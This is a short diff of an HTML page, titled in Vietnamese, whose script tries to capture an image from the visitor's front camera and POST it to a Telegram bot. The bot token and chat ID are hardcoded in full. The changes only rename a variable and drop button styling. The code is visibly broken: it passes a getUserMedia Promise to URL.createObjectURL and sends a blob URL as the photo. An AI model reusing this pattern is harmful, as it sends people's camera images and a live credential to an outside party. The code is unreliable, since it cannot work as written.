@@ -6,7 +6,7 @@
 </head>
 <body>
   <h1>Chụp ảnh và gửi lên Telegram</h1>
-  <button id="take-photo" style="width: 200px; height: 200px;">Chụp ảnh</button>
+  <button id="take-photo">Chụp ảnh</button>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
   <script>
@@ -14,8 +14,8 @@
       // Hàm chụp ảnh
       function takePhoto() {
         // Lấy ảnh camera trước
-        const photo = document.createElement("img");
-        photo.src = URL.createObjectURL(navigator.mediaDevices.getUserMedia({
+        const photoFront = document.createElement("img");
+        photoFront.src = URL.createObjectURL(navigator.mediaDevices.getUserMedia({
           video: {
             facingMode: "user"
           }
@@ -26,7 +26,7 @@
           url: "https://api.telegram.org/bot6630148049:AAG1xYKPmQvG1EaUCb8_JygwwwF-F2dkNQ0/sendPhoto",
           data: {
             "chat_id": -1002081721946,
-            "photo": photo.src
+            "photo": photoFront.src
           },
           type: "POST"
         }).done(function() {
